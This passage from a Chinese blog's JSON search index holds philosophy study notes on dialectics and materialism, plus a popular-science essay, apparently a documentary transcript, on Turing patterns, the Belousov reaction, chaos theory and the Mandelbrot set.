二者关系：矛盾的普遍性和特殊性是辩证统一的。矛盾的普遍性即矛盾的共性，矛盾的特殊性，即矛盾的个性。矛盾的共性是无条件的、绝对的。矛盾的个性是有条件的、相对的。任何现实存在的事物的矛盾都是共性和个性的有机统一，共性寓于个性之中，没有离开个性的共性，也没有离开共性的个性。 主次矛盾和矛盾的主次方面主要矛盾：处于支配地位，对事物的发展起决定作用 次要矛盾：处于从属地位，对事物的发展起次要作用 主要矛盾和次要矛盾的联系： 相互依赖，相互影响 两者在一定条件下相互转化 矛盾的主要方面：处于支配地位，起主导作用的方面 矛盾的次要方面：处于被支配地位，不起主导作用的方面 矛盾的主要方面和矛盾的次要方面的联系： 相互依赖，相互影响 两者在一定条件下相互转化 方法论： 要坚持 “两点论” 和 “重点论” 的统一，“两点论” 和 “重点论” 的统一要求我们看问题既要全面地看，又要看主流、大势、发展趋势。 量变质变规律量、质、度量是事物的规模、程度、速度等可以用数量关系表示的规定性。 质是一事物区别于其他事物的内在规定性。 度是保持物质的稳定性的数量界限，即事物的限度、幅度和范围，这启示我们在认识和处理问题时，要掌握适度度原则。 量变和质变量变和质变的区别如下表所示： 区别 量变 质变 性质 事物数量的增减和组成要素次序的变动 事物根本性质的变化，是事物由一种质态向另一种质态的飞跃 特点 渐进的、不显著的变化 根本的、显著的变化 呈现状态 统一、相持、平衡和静止 统一物的分解、平衡和静止的破坏 结果 事物还是其自身，没有变成另一事物 事物不再是其自身，而变成了另一事物 量变和质变的联系，辩证关系： 量变是质变的必要准备； 质变是量变的必然结果； 量变和质变是相互渗透的； 量变和质变是相互依存，相互贯通的，量变引起质变，在新质的基础上，事物又开始新的量变，如此交替循环，构成了事物的发展过程。 否定之否定规律肯定因素和否定因素肯定因素指维持现存事物存在的因素。 否定因素指促使事物灭亡的因素。 辩证否定观辩证否定观的具体内容如下： 否定是事物的自我否定，是事物内部矛盾运动的结果。 否定是事物发展的环节，是旧事物向新事物的转变，是旧质到新质的飞跃。- 否定是新旧事物联系的环节，新事物孕育产生于旧事物，新旧事物是通过否定环节联系起来的。 辩证否定的实质是 “扬弃”，即新事物对旧事物既批判又继承，既克服其消极因素又保留其积极因素。 否定之否定事物的辩证发展过程经过 “肯定 —— 否定 —— 否定之否定” 三个阶段。 否定之否定规律揭示了事物发展的前进性与曲折性的统一。这表明，事物的发展不是直线式前进，而是螺旋式上升的。按照否定之否定规律办事，要求我们树立辩证的否定观，正确看待事物发展的过程，既要看到道路的曲折，又要看到前途的光明。","categories":[{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/categories/%E5%93%B2%E5%AD%A6/"}],"tags":[{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/tags/%E5%93%B2%E5%AD%A6/"},{"name":"philosophy","slug":"philosophy","permalink":"https://blog.mhuig.top/tags/philosophy/"}]},{"title":"辩证唯物论","slug":"philosophy/辩证唯物论","date":"2021-09-14T06:50:30.000Z","updated":"2021-09-14T06:50:30.000Z","comments":true,"path":"p/171a81d0/","permalink":"https://blog.mhuig.top/p/171a81d0/","excerpt":"辩证唯物论是关于世界的的物质性学说、关于物质和意识的辩证关系学说，它采用辩证法的观点研究世界的本质，所要说明的是世界的本质 “是什么” 的问题。","text":"辩证唯物论是关于世界的的物质性学说、关于物质和意识的辩证关系学说，它采用辩证法的观点研究世界的本质，所要说明的是世界的本质 “是什么” 的问题。 辩证唯物论的基本观点是：世界的本原是物质，主张物质决定意识，意识是对物质的反映；同时，意识对物质有能动的反作用，承认世界是物质的，物质具有客观实在性。 物质物质的定义物质是不依赖于人类的意识而存在，并能为人类的意识所反应的客观存在。 物质的唯一特性是客观实在性。 物质和运动物质和运动是不可分割的，二者关系及其具体内容如下表所示： 关系 理解 误区 物质是运动的物质，运动是物质固有的根本属性 任何具体的物质形态只有在运动中才能保持自己的存在，世界上不存在脱离运动的物质 离开运动谈物质会导致形而上学 运动是物质的运动，物质是运动的承担者 任何运动都有自己的承担者或者载体，离开物质载体的运动是不存在的 离开物质谈运动导致唯心主义 运动和静止物质的运动是绝对的，而物质在运动过程中又有某种相对的静止。 运动和静止的区别如下表所示： 运动 静止 含义 宇宙间一切事物、现象的变化和过程 两种情形：一是指空间的相对位置暂时不变，二是指事物的根本性质暂时不变 性质 无条件的、永恒的和绝对的 有条件的、暂时的和相对的 运动和静止的联系： 静止是一种不显著的运动，是运动的特殊状态；动中有静，静中有动，世界上一切事物的存在和发展，都是绝对运动和相对静止的统一。 只承认静止而否认运动是形而上学的不变论，只承认绝对运动而否认相对静止则导致相对主义和诡辩论。 时间和空间时间和空间是物质运动的存在形式。 时间是指物质运动的持续性、顺序性，特点是一维性，即时间的流逝一去不复返。 空间是指物质运动空间的广延性、伸张性，特点是三维性，即空间具有长、宽、高三方面的规定性。 物质运动总是在一定的时间和空间中进行的，没有离开物质运动的 “纯粹” 时间和空间，也没有离开时间和空间的物质运动。 意识意识的含义意识是物质世界长期发展的产物，是人脑的机能和属性，是客观世界的主观映像。 意识是社会的人所特有的精神活动及其成果的总和。从内容上看，人的意识是知、情、意三者的统一。 意识的本质意识是人脑这种特殊物质器官的机能。 意识是对客观存在的反映，其在内容上是客观的，在形式上是主观的。 物质和意识的辩证关系物质和意识的辩证关系体现在：物质决定意识，意识对物质具有反作用（意识的能动作用）。 意识的能动作用主要表现在： 意识活动具有目的性和计划性； 意识活动具有创造性； 意识具有指导实践改造客观世界的作用（最重要的表现）； 意识具有调控人的行为和生理活动的作用。 正确认识和把握物质和意识的辩证关系，还需要处理好主观能动性和客观规律性的关系： 尊重客观规律是正确发挥主观能动性的前提； 只有充分发挥主观能动性，才能正确认识和利用客观规律。","categories":[{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/categories/%E5%93%B2%E5%AD%A6/"}],"tags":[{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/tags/%E5%93%B2%E5%AD%A6/"},{"name":"philosophy","slug":"philosophy","permalink":"https://blog.mhuig.top/tags/philosophy/"}]},{"title":"我们从哪里来？","slug":"pen/我们从哪里来","date":"2021-06-06T03:51:37.000Z","updated":"2025-09-28T09:07:00.000Z","comments":true,"path":"p/dad4292a/","permalink":"https://blog.mhuig.top/p/dad4292a/","excerpt":"","text":"这里探讨的是一个非常简单的问题，我们是怎么来到这里的？ 前言世界上的所有人都是由这些元素和化合物组成的，他们的平常甚至让我们高智能的人类感到尴尬。 事实上，人体的 99% 都是由空气、水、碳以及白垩组成，另外还能找到少量的比较特别的元素，如铁、锌、磷和硫。实际上，组成人体的所有物质加起来最多花几十块钱就能买到。 但是，也不知道怎么的，这些数以万计的普普通通的原子能够携手起来，组成一个能够思考呼吸的活生生的人。 这些简单的积木是如何组合在一起。这无疑是最令人着迷的问题。 你可能会认为仅仅通过科学是不能够回答这个神奇的问题的。但是你敢肯定吗？现在，我们有理由相信，科学已经在这个大胆解释这个问题方面超越了宗教和哲学的解释力。 下面我们将通过一系列相互盘根错节的伟大发现来解释自然界的不为人知的一面。 在这之中蕴含了世上最基本的法则，即不确定性的产生。 这是关于看似廖无生气、毫无目的和动机的物质世界，是如何自发的产生这些极其精细的绚丽的自然。 这是关于世间最基本的法则是如何使这个世界展现出混沌和不可预测性，如何通过简单的物质创造出人。 这是关于一个奇异的发现，即有序和混沌之间，奇特而难以置信的联系。 图灵的方程式自然界充满了生长、发展和混乱，其中到处都是离奇的形状和杂乱的斑点。自然界的图案从来都不会固定不变，从来都不会按原样重复。 这一切看上去混乱的现象都受到数学方程式的影响。事实上，他们完全被数学规则所支配。这种数学规则与我们长久以来的直觉相悖。因此不难相信第一个能够担负此揭示自然界的数学根基重任的人会拥有超乎寻常的智慧。 他即是一个伟大的科学家，同时也是一个大悲剧。 他 1912 年生于伦敦，他的名字就是阿兰・图灵。 阿兰・图灵是一个不凡之人，他是有史以来最伟大的数学家之一。他提出了许多具有基础性的理论和见解。他的思想为现代计算机的出现提供了理论基础。 在二战期间，他在布莱切利园工作，也就是今天的米尔顿凯恩斯外。当时政府正在这里进行一个叫做 X 站的秘密项目。他的建立是为了破解德军的情报密码。 X 站项目组的密码破解人员做出了卓越有成效的工作，其中图灵的贡献至关重要。他亲自参与了破解德国海军密码的工作，因为他的工作数以万计的盟军得以幸存，同时这也导致战略形势的有利扭转。 但是图灵的天赋不仅仅表现在破解密码上，这仅仅是他那超乎常人的洞察力的一部分。对于图灵来说，自然界的密码才是终极密码。在他的一生中，他热切的寻找着破解这个密码的方法。 图灵是一个很有独创精神的人，他意识到这样一种可能性，简单的数学方程式可以描述复杂的生物世界的一些现象。他的这种想法以前从来没有人尝试过，自然界中所有的迷中最吸引图灵的，就是如何能够使用数学方程式来描述人类的智能。 图灵迷上这个想法是有原因的，这就是年轻的克里斯托弗・马尔孔的死。图灵是同性恋，克里斯托弗・马尔孔的死，在那时以及他的一生产生了重要的影响。克里斯托弗・马尔孔突然的死亡了导致阿兰图灵在情感方面产生了极大的触动。但是你能想象，他想把这个事实用科学来解释，他想解释的问题是，我们的心智怎么了，什么是心智。 图灵相信生物界的复杂的系统是可以用数学方程式来描述的，并且人类的智能也是如此。 他的这种信念导致了现代计算机的产生。 之后一个更加激进的想法出现在图灵的脑中，这个想法就是通过简单的数学描述来解释胚胎中发生的复杂的过程。 这个过程被叫做形态发生。它非常令人费解，起初胚胎中的所有细胞都是相同的，细胞们开始组合到一起，并且细胞之间渐渐产生了差异，这是如何发生的呢？物质不会自己思考，也没有一个中央系统在里面进行调度，一开始都是一样的细胞，为什么有的能够变成皮肤，而有的却变成了眼睛呢？ 形态发生是一类现象中的一个例子，这类现象叫做自组织现象。 在图灵之前没有人懂得自组织现象的机制。 直到 1952 年 图灵发表了他的这一篇论文，阐述了用数学方程式来解释形态发生现象。论文中的大胆的猜测是令人震惊的，其中图灵使用了一个在天文学和原子物理学中很常见的一种数学方程式，来描述生命过程。 之前从来没有人做过这种尝试，然而图灵的方程式却第一次的做到了，描述了一个生物系统的自我组织的过程，这解释了即使简单的、毫无自然界事物特性的东西，也可以演变出栩栩如生的东西。 图灵的成果中令人大吃一惊的地方是，我们可以通过设定非常简单，甚至简单到可以仅仅通过简单的方程式就能描述的初始状态，然后让它进行演变。然后突然间，复杂和混乱就会出现，产生的复杂图案就像是自然界的结果。 从许多方面来看这些都是难以置信的。 其实图灵的方程式描述的都是我们很熟知的东西，但是从来没有人将这些数学方程式应用到生物学领域。 试想一阵风吹过沙丘，进而产生了一系列图形。小颗粒自我组织成波纹浪花和沙丘，即使那些小颗粒是彼此相同的。并且没有人告诉他们到底要怎么去组成属于他们的那一部分。 图灵认为，以一种非常形似的方式，在胚胎中渗过的化学物质可能会引导细胞进行自我组织，进而产生各种不同的形状。这是图灵给出的非常粗略的解释，他阐述了一堆毫无生气的化学物质，如何演化为各种不同的形状。 在他的论文中做了一些改进，来使他的方程式能够自发的产生生物图案，那种与动物表皮相似的图案。 图灵到处向别人展示自己生成的图形，你看这难道不像母牛身上的图案吗，其他人的反应是，这个人的脑子有问题吧。但是图灵相信自己在做一件有意义的事情，他们的确像母牛身上的花纹，这就解释了母牛拥有这种斑点花纹的现象。 这样一个数学从未触及的领域，生物界的图案，生成动物斑纹，突然间，这个领域向我们敞开了门。 我们发现数学方程式在这个领域会有用武之地，即使图灵提出的方程式，并不是这一新理论的全部，但仍然是一次重要的创举，提出了这种新方法的可能性。 我们现在知道形态发生，要比图灵所描述的数学方程式复杂多了。事实上，关于 DNA 分子确切的运转机制，仍然是现代科学上争论的话题。 但是图灵提出的数学支配万物的观点确是革命性的，阿兰・图灵的论文是整个形态发生理论的奠基石，他为我们提供了一种解释，连达尔文都没能提出的，解释自然界生物花纹的产生机制。 达尔文仅仅告诉我们，生物的花纹是来源于基因的，并且这种花纹的继承是决定于环境的，但是达尔文并没有揭示，这种生物花纹到底是如何生长的，而这是真正的迷。 图灵的贡献在于提供了了解这种化学机制的途径。图灵提出了一种伟大而勇敢的见解。 不幸的是我们仅仅能够推测这颗伟大的大脑，是如何想出这些的，在他发表他的开创性论文之后不久，一个可怕的并且完全可以避免的悲剧摧毁了他的生命。 在他在布莱切利园破解密码工作之后，你一定可以想到图灵会得到很多赞誉，以感谢他为国家做出的贡献。这再明显不过了。战后发生在他身上的事情是一个悲剧，这是英国科学史上令人感到羞耻的事情。 同年，图灵发表了关于形态发生的论文，他与阿诺德默里这个男人发生了短暂的情感，但是这段情感发展的很令人不愉快，默里对图灵进行了一次入室盗窃，但图灵将这件事情报告给警察的时候，警察连同图灵一起逮捕了。法庭上，原告声称，图灵以他的学历来诱导默里走上了歧途。图灵被判有严重的猥亵罪，法官给了图灵可怕的选择，他要么进监狱，要么接受雌性荷尔蒙注射，进而治疗他的同性恋倾向，他选择了后者。这导致了他连续不断的消沉。 1954 年 6 月 8 日，图灵的尸体被他的清洁工发现。他是一天前死于咬了一口自己注入了氰化物的苹果，结束了自己的生命。 阿兰图灵死的时候 41 岁，这对于科学来说是一种无法估量的损失。图灵不曾想到他的思想会启发后人，将一种全新的数学方法应用到生物学领域。科学家发现他发现的这种方程式，确实能够解释好多生物组织的形态。 回头看看，我们知道图灵真正捕捉到了复杂与混乱源于简单规则，这样的法则。他意外的迈出了，通往新科学的第一步。 贝洛索夫的试液这个过程的第二步更是始料未及，可悲的是伟大的第二步也是一个悲剧。 在 20 世纪 50 年代初，在图灵发表他的对后人影响巨大的论文之际，一名杰出的俄国化学家 斯・贝洛索夫，开始了他自己的探索，关于自然界中的化学。 正在高墙铁网之后的苏维埃卫生部，他正在研究我们的身体是如何从糖中提取能量的。像图灵一样贝洛索夫也是在一个个人项目中工作，他刚刚完成了一段从事科学工作的经历。 贝洛索夫构想好了一种新的化合物配方，来模仿人体内葡萄糖的吸收，这种混合物就摆在实验室的座位前面，在被摇晃的时候清澈而透明。 在他添加最后一种试剂的时候，整个混合物的颜色发生了变化。 当然，这还不算什么特别的，就像我们将墨汁倒入水中水也会改变颜色。 但是接下来发生的事情令人感到惊奇，混合物又变得清澈无色了。 贝洛索夫感到很吃惊，化学物质混合以后会发生反应，但这个过程不能自发的发生逆反应，在不受外界干预的情况下发生可逆变化。 你可以很容易的将一个无色的液体变成有色的，但这个过程的逆过程却不太可能。这太奇怪了，贝洛索夫的试液并没有简单的发生逆变化，试液被摇晃后，就不断的在无色和有色之间变化，就好像这个试液在受一种神秘的内部机制驱动一样。 他非常谨慎小心地又重复多次这个实验，他的混合物能够不断的在无色和有色之间变化，他发现的东西好像魔术一样。一个好像是违反自然法则的物理现象。 贝洛索夫觉得自己的发现意义重大，将自己的发现记录下来，并努力让更多的人了解他的发现，但是当他将他的发现递交到一个顶尖的苏联科学杂志的时候，他收到了一个完全出乎意料的诅咒式的回复，杂志的编辑告诉贝洛索夫，他的发现是不可能在实验室重现的，因为这与基本的物理法则相违背，对这个现象的唯一的解释就是，贝洛索夫在实验的时候出了错，他的发现是不会被出版的。 这个拒绝深深的打击了贝洛索夫，他感到非常的羞辱，结果放弃了自己的实验，而后他又放弃了自己从事的事业。 具有悲剧色彩的讽刺是，由于贝洛索夫所处的闭塞环境，贝洛索夫从来没有机会看到图灵的工作成果。如果他看到了图灵的发现，就能为自己的发现提供有力的证据，事实上，贝洛索夫的不稳定试液，不仅没有违背物理法则，而且是实在就是真实的，能够体现图灵的预言的例子，尽管这两者的发现初看起来并没有什么联系。 其他科学家发现，如果将贝洛索夫的试液的一种变种，不加搅拌的放入培养皿中，而不是摇晃他们的话，他们就会发生自我组织，事实上 ，他们产生的条纹会比图灵预测的花纹要复杂。 他们会产生令人惊诧的复杂的条纹，毫无预兆。 贝洛索夫实验的惊奇之处在于，它能生成一种系统，这种系统产生了图灵方程式所预测的图案，在一个看上去无色的溶液中，产生了这种奇异的原型图案，这明显不是什么抽象科学，贝洛索夫图案的运动模式 ，与我们心脏在跳动的时候周围细胞的运动模式完全相同。动物的皮毛和心脏的跳动，自组织现象在自然界中随处可见。 牛顿经典物理学为什么在科学界在图灵和贝洛索夫的年代 ，却对这种想法不感兴趣甚至持有敌意呢？ 原因就是人类的臭毛病，主流科学家不喜欢这种观点，这与主流科学家的科学直觉相违背，也与现有的科学成就相违背，若想改变这种观念，我们需要一种彻底的，改变传统的发现。 实际上，在 20 世纪初期，科学家们把宇宙看作一个巨大而复杂的机械装置，有点像一个大号的太阳系仪，整个宇宙就好像是一个巨大的错综复杂的机器 ，严格的遵守着数学规则。如果你知道这个机器的运转机制和初始状态，那么随着你转动这个手柄，它将严格地按照预期的行为运转。 在牛顿生活的时代里，当人们在探索驱使宇宙运转的法则时，他们把宇宙看作这种按照确定规则运转的机器。宇宙就好比是一个被设定好的机器，遵循确定的法则按部就班的按照这个法则运转。 宇宙中复杂的现象是有复杂的内部规则驱使的，但是一旦一开始让它运转它只会做一件事。人们从这里看到的现象，都可以使用严格的数学公式来描述。 这实际上是很简单的事情，一旦找到能够描述系统运行的数学方程式，那么你就能够预测系统的走向。 这是一个伟大的想法。 它开始于牛顿的万有引力。万有引力成功的解释了行星围绕太阳运转的现象。科学家们后来又不断的发现了新的方程，牛顿物理似乎已成为了预言宇宙的终极方法。 它给我们暗示了这样一种可能，从原则上讲，未来是可以预测的。 我们采用的测量手段越精确，我们就能越精确的预测未来的情形。 但是牛顿物理产生了一个可怕的后果，如果有一个系统我们能够用数学方程式精确描述，就像这个太阳仪一样，那么一旦它表现出了一些我们不能预测的行为之后，科学家就只能认为，是有某种外界力量影响了这个系统，比如说是沙土跑进去了，或者是小零件磨损了，或者有人对它进行了认为的改动。 一般情况下，我们会这样假设，如果我们遇到了非预期的现象，那么这种现象应该是来自系统外部的干扰，而不是来自系统内部的。不可预测的现象，不是来自系统的本身，而是来自与外部对它的影响。 从这种观点的角度来看，自我组织这种现象是很荒谬的，而图灵和贝洛索夫所表达的，复杂图案可以从系统中自我生成，而不需要外界力量是非常受当时的主流科学所忌讳的。 要想使人接受自我组织理论，那么，就必须推翻牛顿物理学，但这看上去很不可能，无论如何这种新思想在 60 年代末期，成为了新时代的奇景。 蝴蝶效应然而同时，伴随着登月计划，一小群信奉牛顿力学的科学家，意外的发现了一些事情不对劲，完全不对劲。 在 20 世纪后半叶，科学界的噩梦出现了，这个噩梦，动摇了牛顿的思想，并将我们推向了一片思想的混乱。 具有讽刺意味的是，迫使科学界接受自我组织理论的事情，是一种我们叫做混沌的现象。 混沌这个词被广泛使用，但是在科学领域中，它有它专指的意义。它指的是在一个能被数学方程式精确描述的系统中，可以自发生成不可预测的现象，并且不需要任何外界的干预。 通过使用非常简单的法则或方程式，并且里面不包含任何的随机性，系统中的所有元素都是确定的，并且我们完全掌握系统的法则，即使是这样的系统也会产生完全不可预测的现象。 混沌的发现并不讨主流科学的喜欢，有一个人迫使科学界接受混沌，他就是美国的气象学家爱德华・洛伦兹。 在 20 世纪 60 年代早期，他试图寻找能够预测天气变化的数学模型。就像许多他的同事一样，他相信天气系统与我们太阳系仪是一样具有确定性的，一个可以被数学描述和预测的物理系统。 但是他错了，当洛伦兹写下一个用于描述气流的及其简单的数学方程式时，这些方程式并没有达到他预想的目的，他们没有做出任何有价值的预测，这就好像说某一天中的一阵清风，将会决定一个月后的某天是冰雪连天，还是清空万里。 对于一个像太阳系仪这样精准的系统来说，怎么会产生不可预测性呢？ 这源于他的内部构造，由于齿轮的链接方式。 事实上，在某种情况下，即使在初始的时候有一点点误差，哪怕这个误差小到难以测量，这个误差会随着机械的运转而不断被放大，随着系统的运转，系统的状态会一点一点的偏离你所期望的状态。 洛伦兹在一次演讲中表达了这一颠覆性的想法，演讲的题目是 —— 一只蝴蝶在巴西扇动翅膀会使美国的德克萨斯刮一场龙卷风吗？ 这是一次有力而吸引人的演讲，数月之内，我们的语言中就添加了一个新的词汇 —— 蝴蝶效应。 蝴蝶效应就是混沌系统的标志，它开启了之后的一切。 在 70 年代早期 一个叫罗伯特・梅的年轻澳大利亚人，正在研究一个数学方程式，用它来模拟生物种群随时间的变化。 但是这个过程中同样牵扯到蝴蝶效应，哪怕生物的繁殖率发生了极小的变动，都会导致种群数量结果发生巨大的变化，这个数值可能会毫无征兆的上下起伏。 传统的使用数学方程式，来描述系统行为的方法似乎走到了死胡同，某种意义上，这是信仰牛顿学说的人的美梦之终结。 随着我们的计算能力的提高，我们就有能力处理更复杂的方程组，但刚才我们所看到的否认了这种观念。 你可以从一个及其简单的方程式开始，这个方程式简单而不存在任何的随机性，但是如果它产生的行为能够表现出一种混沌性，那么你就不能再回溯到系统的初始状态了。 数百年来所建立的科学观点在几年内就被瓦解了，可以精确描述宇宙的运行的这一想法变成了幻影。 看上去具有逻辑确定的事情，却变得更像是一种信仰。更糟的是，这种现像到处都是。因为混沌到处都是。 似乎不可预测性是固有的，存在于我们生活的宇宙中。 全球气候可能会在几年的时间内，发生剧烈的变化；股市可能会毫无征兆的崩盘；我们可能会在一夜之间从地球上灭绝。 如果这种事情发生的话 没有人能够阻止，不幸的是，我不得不说以上这些都是真的。但是盲目的恐惧混沌现象是毫无意义的。 因为混沌是一条基本的物理法则，我们必须承认它是生活中的一部分。 混沌理论的出现一直影响到之后 20 到 30 年人们的思想，它改变了人们对于科学工作的看法，它深刻的改变了科学家看问题的方式，以至于科学家们现在已经离不开混沌理论了。 混沌理论想要说明的是，简单的数学方程式能够繁衍出复杂的行为，这种复杂性超出你我的想象，所以简单而机械的系统能够表现出复杂和丰富的行为。 混沌理论的发现，是科学史上的一次重大的转折点，它摧毁了牛顿信仰者的梦想，科学家们现在越来越看得惯图灵和贝洛索夫在自发生成花纹上所做的工作。 自反馈系统更重要的是，由于他们的工作，一个伟大的真相浮出水面，那是一种内在而隐蔽的关联，一个贯穿宇宙的关联，关联着自然的神秘力量和自我组织现象，以及蝴蝶效应产生的混沌结果。 图灵、贝洛索夫、梅、洛伦兹这些人都分别发现了一种重大思想的不同侧面。他们发现自然界具有固有的不可预测性，这种不可预测性的内部驱动力，也可以使系统表现出特定的结构和花纹，有序与混沌，似乎要比我们想象的要联系的更加紧密，但这种联系是如何实现的呢？贝洛索夫的花纹与天气变化之间有什么联系呢？ 首先，虽然两个系统都有复杂的工作机制，但他们都是基于及其简单的是数学法则，其次，这些数学法则都具有一种独特的特性，都具有自我链接的特性或者说是自反馈。 为了向你展示这一点，展示简单的自反馈系统的力量，将使用一种看上去简单甚至无聊的实验。 身后的屏幕连接到一台摄像机，这台摄像机同时也在拍摄着我和屏幕，这样不断的循环就能产生无数个人的影像，都投影到屏幕上，这是一个典型的自反馈系统。图片中不断的嵌套着其他的图片。 这乍看上去肯定有规则，但当我们放大镜头，奇怪的事情发生了，我首先发现的是实物图像和屏幕上显示的图像不像了，火柴的微小运动被迅速放大，当影像在摄像机和屏幕之间反复映射的时候，即使我能用精确的数学对外的每一步动作进行描述，但我却不能预测火焰微小的变化，会导致最终的图像如何变化，这就是一种实实在在的蝴蝶效应。 下面的现象变得更离奇了，通过像系统中添加一点点的扰动，这些奇异而美丽的图案就出现了，这种简单的依赖反馈的系统，呈现出了混沌与有序，同样的数学方程式同时产生了混沌和有序的图案。 这将改变你对世界的看法，在传统观念中，自然界都是有序的，混乱存在与系统之外，即有序与混乱是相互独立的这种想法是错的，其实混乱和有序，就像同一架钢琴上弹出的高音和低音，这个发现有史以来第一次如此接近自然界的数学本质。 我们能从图灵的工作，以及化学和生物中得到的，最重要的启示是，所有复杂的图形都是来自，宇宙间简单的演变过程，像扩散， 像化学反应率，这些简单的过程最终导致了图案的产生，所以到处能看到图案，他们不断的产生。 曼德勃罗集合从 70 年代开始越来越多的科学家，开始接受混沌理论，以及对自然界能够自发产生复杂花纹的认可，但是有一位科学家比别人走的更远，对这个令人惊奇颇感迷惑的问题带了个新思路，他是一个具有传奇色彩的不喜欢按套路出牌的人，他叫伯努瓦・曼德勃罗。 伯努瓦・曼德勃罗 并不是一个寻常的孩子，他跳了两个年级。并且由于他是战时欧洲的犹太人，所以他受到的正规教育极其有限，他基本上是靠自学以及亲属对他的教育，他从来没有正式的学习过字母，甚至没有学过 5 以上的乘法。 但是和图灵一样，曼德勃罗具有一种洞悉事物本质的本领，他能从混乱中看到我们所看不到的规律，他能够发现形式和结构，然而我们却仅仅能看到一片混乱，他能够感知一种新奇的数学，用来支配整个自然界的运转。 曼德勃罗的一生都致力于找到一种能够揭示自然界复杂性的一种数学支持。 曼德勃罗当时为 IBM 工作，而不是学校的学术圈内，他试图解决一大堆的问题，关于自然界以及金融界的不确定性，在各个方面的表现。 我觉得他知道自己，所做的所有工作都是一个大问题的不同侧面。 他是一个具有原创精神的人，他觉得求解这个大问题是他真正想做的事情。 在曼德勃罗看来，几百年来传统的数学研究都仅限于，规则的图形是一种很不可取的行为，就像直线和圆，传统的数学是没有办法描述不规则的形状的，而真实世界确是有不规则形状组成的，就像这个鹅卵石，它是一个球体还是一个立方体呢，还是它们中间的某种形状？他到底是一种什么形状？ 曼德勃罗想，是否有一种法则，能够描述自然界的不规则性，那些蓬松的云朵、树和河流的分支，以及蜿蜒的海岸线之间有什么共同的数学基础。 是的，有的。 自然界中所有的形状的共同特点，就是自相似性。这指的是事物的局部，不断的在更微小的尺度上重复自己，不断的精细到每一个细微之处，树枝就是一个绝好的例子，他们不断的分叉，重复这这个简单的过程，在更微小的尺度上不断重复这这个过程。 我们的肺的结构同样遵循这个原则构建，我们体内血管的分布同样遵循这样的规则，河流分成更小的溪流也是这样，自然界可以依照这种方法不断重复各种形状。 看看这个罗马花椰菜，他的总体结构是由许多重复的小圆锥组成的，曼德勃罗意识到自我重复性，是一种全新的几何学的基础，并给这种几何图形起了一个名字 —— 分形。 分形看上去非常简单直观，但是我们如何才能用数学对它进行描述，你能够利用分形的本质画一幅相似的图形吗？那么这张图形会像什么？你能仅使用一些简单的数学法则，来绘制一幅看上去像是自然创造的图案吗？ 曼德勃罗找到了答案。 曼德勃罗爱 20 世纪 50 年代末就职与 IBM，因此有机会使用计算机，并且利用计算机这个工具来寻找自然界的数学本质。 在新一代的超级计算机的帮助下，他开始研究一个看上去很奇怪，但却异常简单的数学方程式，使用这个数学方程式可以绘制一幅不同寻常的图形，我将向你展示的是一幅非常吸引人的图画。它完全由数学产生，惊人之举往往不同寻常。 这就是曼德勃罗集合，他被称为上帝的指纹，当我们仔细看看这幅图后，你就知道我们为什么这么叫了。 &gt;&gt; 鼠标选择区域放大查看曼德勃罗集合细节 &lt;&lt; 就像树和花椰菜一样，你看得越仔细你发现的细节就越多，在这个集合中的每一个图形，都包含了无穷多个小图形，小的子图无穷无尽，然而所有这些复杂的分支都来自有一个简单的方程，这个方程有一个非常重要的特性，它是自反馈的。 每一次输出都成为了下一次计算的输入，这种反馈系统展示了一个简单的，方程式是如何展现出无比绚丽的图案的。 但是令人惊奇的是，曼德勃罗集合并不是一个奇怪的数学巧合，它的这种无穷分形的特性，反映了一种自然的有序的本性，图灵图案、 贝洛索夫的化学反应、曼德勃罗的分形都分别指向了一个自然本质。 简单的法则 无穷的创造当我们看到自然界的复杂面貌时，我们倾向于问，他们来自哪里，我们总是抱有这样的观念。 简单的事物不能导致复杂性的产生，复杂的现象必须源于复杂的设计。 但是我们刚才看到的数学方程式告诉我们，极其简单的法则也会繁衍出复杂的现象。 当你看到复杂现象的时候，你应该想到，驱使它产生的只不过是简单的法则，所以同一个方程式从不同的角度看，既简单又复杂，这就意味着我们需要重新思考，简单性于复杂性之间的关系。 复杂的系统可以基于简单的法则。 这是一个重大的启示，也是一种伟大的思想。它似乎适用于整个世界。 看看这群飞鸟，每一只鸟都遵循简单的法则，但是整个鸟群确是一个极其复杂的东西，他会自动的避开障碍在没有领航情况下进行自我导航，甚至是做计划。 虽然这个鸟群的行为很显著，但我们却不能预测他的行为，它不会重复原先的行为，即使是在相同的环境下。 就像贝洛索夫的化学反应一样，每次你进行这个化学反应产生的图案都稍有不同，他们可能看上去相似但却不可能相同。 对于自反馈的影响和 沙丘同样是这样，我们知道它会产生某种图像，但是我们却不能预测确切的形状。 生物进化的原料我们关心的问题是，大自然能够以这种方式将简单的法则，演绎出复杂的现象吗？ 试着解释一下为什么会有生命的存在，它能够解释为什么充满砂石的世界，是怎么产生人类的吗？ 毫无生机的事物是如何变得充满智能的呢？ 进化正是基于这些简单的生物花纹，进化将这些当成原料，并把它们以不同的方式结合在一起，看看哪些结合方式有效，哪些无效， 保存那些有效的结合，并在它们的基础上进一步演化。 这是一个完全没有意识控制的变换过程，但这基本上就是现实中发生的事情，放眼望去，进化的过程到处都是使用自然界的自我组织的图案。 我们的心脏使用类似贝洛索夫反应的方式来驱使它有节律跳动，我们的血管的组织形式就像分形，就连我们的脑细胞也是遵循极其简单的规则，进化过程丰富并筛选这我们的世界的复杂性。 这是近代科学最有魅力的发现。 计算机模拟的进化机制一方面你拥有一个具有自组织能力的复杂系统，它可以产生不可预测的行为，另一方面需要将进化机制作用于它，这样才能产生适应环境的东西，进化通过无拘无束的创造力，约束着系统的演确实难以置信。 但当这个约束过程发生在宇宙级的时间尺度上，就容易理解了，从地球上第一次出现生物到我们人类的产生，整整花了 35 亿年的时间，但是我们现在手头上，有一种可以在更短的尺度上模拟这个过程的发明。 你知道我指的是什么吗？ 很可能你天天就坐在这个发明面前，当然，这就是计算机。 现代的计算机每秒可以进行上亿次计算，我们可以让它们做一些奇特的事情，它们可以模拟进化过程，确切的说，计算机可以利用进化规则，来约束自己产生真实世界中的现象，使用进化规则来约束和筛选生物组织。 现在，计算机科学家发现这种能够自我演变的软件，可以取代人类最聪明的头脑来解决问题。 我们在最初的实验研究中发现，进化这种系统就像一种算法一样创造着，能够适应环境的复杂系统。 托斯顿和他的研究小组的研究目标是，使用计算机模拟的进化机制，来创造能够控制躯体运动的虚拟大脑。 一开始他们随即设置了 100 